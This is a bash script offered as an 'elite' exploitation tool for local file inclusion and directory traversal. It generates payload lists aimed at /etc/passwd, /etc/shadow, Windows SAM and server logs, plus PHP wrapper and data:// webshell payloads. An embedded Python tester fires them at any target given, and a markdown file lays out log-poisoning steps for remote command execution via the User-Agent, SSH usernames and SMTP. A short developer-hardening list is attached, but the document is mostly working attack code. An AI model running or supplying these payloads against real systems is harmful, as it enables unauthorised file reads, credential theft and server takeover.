#!/bin/bash
# 📁 Elite Directory Traversal & LFI Exploitation
# Advanced payloads for Local File Inclusion attacks

echo "📁 Elite Directory Traversal & LFI Exploitation Started"

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./directory_traversal_lfi.sh target.com"
    exit 1
fi

mkdir -p lfi_results
cd lfi_results

echo "🎯 Starting LFI/Directory Traversal testing for $TARGET"

# ===== PHASE 1: PAYLOAD CREATION =====
echo "🛠️ Phase 1: Creating advanced LFI payloads..."

# Basic directory traversal payloads
cat > basic_lfi_payloads.txt << 'EOF'
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../etc/passwd
../../../etc/shadow
../../../../etc/shadow
../../../etc/hosts
../../../../etc/hosts
../../../etc/group
../../../../etc/group
../../../proc/version
../../../../proc/version
../../../proc/self/environ
../../../../proc/self/environ
../../../proc/self/cmdline
../../../../proc/self/cmdline
EOF

# URL encoded payloads
cat > encoded_lfi_payloads.txt << 'EOF'
..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
EOF

# Null byte payloads (for older systems)
cat > null_byte_payloads.txt << 'EOF'
../../../etc/passwd%00
../../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../../etc/passwd%00.png
../../../etc/passwd%00.txt
../../../../etc/passwd%00.html
EOF

# PHP wrapper payloads
cat > php_wrapper_payloads.txt << 'EOF'
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/read=convert.base64-encode/resource=../config.php
php://filter/read=convert.base64-encode/resource=../../config.php
php://filter/read=convert.base64-encode/resource=../../../config.php
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
expect://id
expect://whoami
expect://ls
zip://shell.zip%23shell.php
phar://shell.phar/shell.php
EOF

# Windows-specific payloads
cat > windows_lfi_payloads.txt << 'EOF'
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\system32\config\sam
..\..\..\..\windows\system32\config\system
..\..\..\..\windows\system32\config\software
..\..\..\..\windows\win.ini
..\..\..\..\windows\system.ini
..\..\..\..\boot.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\sam
C:\windows\win.ini
C:\boot.ini
EOF

# Log file payloads
cat > log_file_payloads.txt << 'EOF'
../../../var/log/apache2/access.log
../../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../../var/log/apache2/error.log
../../../var/log/nginx/access.log
../../../../var/log/nginx/access.log
../../../var/log/nginx/error.log
../../../../var/log/nginx/error.log
../../../var/log/httpd/access_log
../../../../var/log/httpd/access_log
../../../var/log/httpd/error_log
../../../../var/log/httpd/error_log
../../../var/log/auth.log
../../../../var/log/auth.log
../../../var/log/syslog
../../../../var/log/syslog
../../../var/log/messages
../../../../var/log/messages
EOF

# ===== PHASE 2: PARAMETER DISCOVERY =====
echo "🔍 Phase 2: Discovering LFI parameters..."

# Common LFI parameters
cat > lfi_parameters.txt << 'EOF'
file
page
include
path
doc
document
folder
root
pg
style
pdf
template
php_path
menu
META-INF
WEB-INF
admin
conf
etc
home
index
main
path
root
etc
var
proc
tmp
boot
mnt
EOF

# Find URLs with parameters
echo "🌐 Finding URLs with parameters..."
if command -v gau &> /dev/null; then
    echo "Using gau to find URLs..."
    echo "$TARGET" | gau | grep "=" | head -100 > target_urls.txt
else
    echo "Creating sample URLs for testing..."
    cat > target_urls.txt << EOF
https://$TARGET/?file=
https://$TARGET/?page=
https://$TARGET/?include=
https://$TARGET/?path=
https://$TARGET/index.php?file=
https://$TARGET/admin.php?page=
https://$TARGET/view.php?path=
EOF
fi

# ===== PHASE 3: AUTOMATED TESTING =====
echo "🤖 Phase 3: Automated LFI testing..."

# Create LFI tester script
cat > lfi_tester.py << 'EOF'
#!/usr/bin/env python3
import requests
import urllib.parse
import sys
import time
import base64
import re

class LFITester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.success_indicators = [
            'root:', 'bin:', 'daemon:', '/bin/bash', '/bin/sh',
            'www-data:', 'apache:', 'nginx:', 'nobody:',
            '[boot loader]', '[operating systems]',
            'Windows Registry Editor', 'HKEY_',
            '<?php', '<?=', 'function ', 'class ',
            'HTTP_HOST', 'SERVER_NAME', 'REQUEST_URI'
        ]
    
    def test_lfi_payload(self, url, payload):
        """Test a single LFI payload"""
        try:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload)
            test_url = url + encoded_payload
            
            response = self.session.get(test_url, timeout=10, allow_redirects=True)
            
            # Check for success indicators
            for indicator in self.success_indicators:
                if indicator in response.text:
                    return {
                        'success': True,
                        'url': test_url,
                        'payload': payload,
                        'indicator': indicator,
                        'response_length': len(response.text),
                        'status_code': response.status_code
                    }
            
            # Check for base64 encoded content (PHP filters)
            if 'php://filter' in payload and len(response.text) > 50:
                try:
                    decoded = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                    if any(indicator in decoded for indicator in ['<?php', 'function ', 'class ', '$_']):
                        return {
                            'success': True,
                            'url': test_url,
                            'payload': payload,
                            'indicator': 'Base64 PHP code detected',
                            'response_length': len(response.text),
                            'status_code': response.status_code,
                            'decoded_content': decoded[:500]
                        }
                except:
                    pass
            
        except requests.exceptions.RequestException as e:
            pass
        
        return {'success': False}
    
    def test_url_with_payloads(self, base_url, payloads):
        """Test a URL with multiple payloads"""
        successful_tests = []
        
        print(f"🎯 Testing URL: {base_url}")
        
        for i, payload in enumerate(payloads):
            if i % 10 == 0:
                print(f"Progress: {i}/{len(payloads)} payloads tested")
            
            result = self.test_lfi_payload(base_url, payload)
            if result['success']:
                print(f"✅ SUCCESS: {payload}")
                print(f"   Indicator: {result['indicator']}")
                print(f"   URL: {result['url']}")
                successful_tests.append(result)
            
            time.sleep(0.1)  # Rate limiting
        
        return successful_tests
    
    def generate_report(self, all_results):
        """Generate LFI test report"""
        report = f"""# LFI Testing Report
Target: {self.target_url}
Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}

## Summary
Total successful LFI tests: {len(all_results)}

## Successful LFI Exploits
"""
        
        for result in all_results:
            report += f"""
### Payload: {result['payload']}
- **URL:** {result['url']}
- **Indicator:** {result['indicator']}
- **Status Code:** {result['status_code']}
- **Response Length:** {result['response_length']}
"""
            if 'decoded_content' in result:
                report += f"- **Decoded Content Preview:**
```
{result['decoded_content']}
```
"
        
        with open('lfi_test_report.md', 'w') as f:
            f.write(report)
        
        print(f"📋 Report saved: lfi_test_report.md")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 lfi_tester.py <target_url_with_parameter>")
        print("Example: python3 lfi_tester.py 'https://target.com/page.php?file='")
        sys.exit(1)
    
    target_url = sys.argv[1]
    tester = LFITester(target_url)
    
    # Load payloads
    payload_files = [
        'basic_lfi_payloads.txt',
        'encoded_lfi_payloads.txt',
        'null_byte_payloads.txt',
        'php_wrapper_payloads.txt',
        'windows_lfi_payloads.txt',
        'log_file_payloads.txt'
    ]
    
    all_payloads = []
    for payload_file in payload_files:
        try:
            with open(payload_file, 'r') as f:
                payloads = [line.strip() for line in f if line.strip()]
                all_payloads.extend(payloads)
                print(f"📝 Loaded {len(payloads)} payloads from {payload_file}")
        except FileNotFoundError:
            print(f"⚠️ Payload file not found: {payload_file}")
    
    print(f"🚀 Starting LFI testing with {len(all_payloads)} payloads")
    
    # Test all payloads
    results = tester.test_url_with_payloads(target_url, all_payloads)
    
    # Generate report
    tester.generate_report(results)
    
    print(f"✅ LFI testing completed! Found {len(results)} successful exploits")

if __name__ == "__main__":
    main()
EOF

chmod +x lfi_tester.py

# ===== PHASE 4: AUTOMATED URL TESTING =====
echo "🔄 Phase 4: Testing discovered URLs..."

if [ -f "target_urls.txt" ]; then
    echo "🎯 Testing URLs from target_urls.txt..."
    
    while read -r url; do
        if [[ "$url" == *"="* ]]; then
            echo "Testing URL: $url"
            python3 lfi_tester.py "$url"
            sleep 1
        fi
    done < target_urls.txt
fi

# ===== PHASE 5: LOG POISONING SETUP =====
echo "🧪 Phase 5: Log poisoning techniques..."

cat > log_poisoning.md << 'EOF'
# Log Poisoning Techniques for LFI

## Apache Access Log Poisoning

1. **Inject PHP code in User-Agent:**
```bash
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "https://target.com/"
```

2. **Access log file via LFI:**
```
https://target.com/page.php?file=../../../var/log/apache2/access.log&cmd=id
```

## SSH Log Poisoning

1. **Attempt SSH login with PHP payload as username:**
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

2. **Access auth.log via LFI:**
```
https://target.com/page.php?file=../../../var/log/auth.log&cmd=whoami
```

## Mail Log Poisoning

1. **Send email with PHP payload:**
```bash
telnet target.com 25
HELO attacker.com
MAIL FROM: <?php system($_GET['cmd']); ?>
RCPT TO: user@target.com
DATA
Subject: Test
<?php system($_GET['cmd']); ?>
.
QUIT
```

2. **Access mail log:**
```
https://target.com/page.php?file=../../../var/log/mail.log&cmd=id
```

## Session File Poisoning

1. **Create session with PHP payload:**
```php
<?php
session_start();
$_SESSION['user'] = '<?php system($_GET["cmd"]); ?>';
?>
```

2. **Access session file:**
```
https://target.com/page.php?file=../../../tmp/sess_[SESSION_ID]&cmd=ls
```
EOF

# ===== PHASE 6: REPORTING =====
echo "📋 Phase 6: Generating comprehensive report..."

cat > lfi_comprehensive_report.md << EOF
# Directory Traversal & LFI Analysis Report for $TARGET
Generated: $(date)

## Summary
- Target URLs tested: $(wc -l < target_urls.txt 2>/dev/null || echo "0")
- Payload categories: 6 (Basic, Encoded, Null Byte, PHP Wrappers, Windows, Log Files)
- Total payloads: $(cat *_payloads.txt 2>/dev/null | wc -l || echo "0")

## Payload Categories

### 1. Basic Directory Traversal
- Standard ../ sequences
- Various depths (3-10 levels)
- Common Linux files (/etc/passwd, /etc/shadow, /proc/version)

### 2. Encoded Payloads
- URL encoding (%2f, %2e)
- Double URL encoding (%252f)
- Unicode encoding (%c0%af)

### 3. Null Byte Injection
- Legacy PHP vulnerability
- Bypass file extension checks
- Format: payload%00.extension

### 4. PHP Wrappers
- php://filter for source code disclosure
- php://input for code execution
- data:// protocol for direct execution
- expect:// for command execution

### 5. Windows-Specific
- Windows path separators (\)
- System files (SAM, win.ini, boot.ini)
- Registry access attempts

### 6. Log File Access
- Web server logs (Apache, Nginx)
- System logs (auth.log, syslog)
- Application logs

## Testing Methodology

1. **Parameter Discovery**
   - Common LFI parameters identified
   - URL collection from target

2. **Payload Testing**
   - Systematic testing of all payload categories
   - Response analysis for success indicators
   - Base64 decoding for PHP filters

3. **Log Poisoning Preparation**
   - Techniques documented for manual testing
   - Multiple attack vectors provided

## Recommendations

### For Developers
1. Use whitelist-based file inclusion
2. Sanitize user input properly
3. Implement proper access controls
4. Use absolute paths instead of relative
5. Disable dangerous PHP functions

### For Penetration Testers
1. Always test multiple payload categories
2. Check for base64 encoded responses
3. Attempt log poisoning when direct LFI works
4. Look for file upload + LFI combinations
5. Test both Linux and Windows payloads

## Next Steps
1. Review lfi_test_report.md for successful exploits
2. Attempt log poisoning on confirmed LFI
3. Look for file upload functionality to combine attacks
4. Test for RFI (Remote File Inclusion) if LFI confirmed
EOF

echo "✅ Directory Traversal & LFI testing completed!"
echo "📁 Results saved in: lfi_results/"
echo "📋 Main report: lfi_comprehensive_report.md"
echo "📋 Test results: lfi_test_report.md"
echo ""
echo "🎯 Usage examples:"
echo "python3 lfi_tester.py 'https://$TARGET/page.php?file='"
echo "python3 lfi_tester.py 'https://$TARGET/index.php?include='"
echo ""
echo "🧪 Manual testing:"
echo "1. Try log poisoning techniques from log_poisoning.md"
echo "2. Test PHP wrappers for source code disclosure"
echo "3. Combine with file upload for RCE"
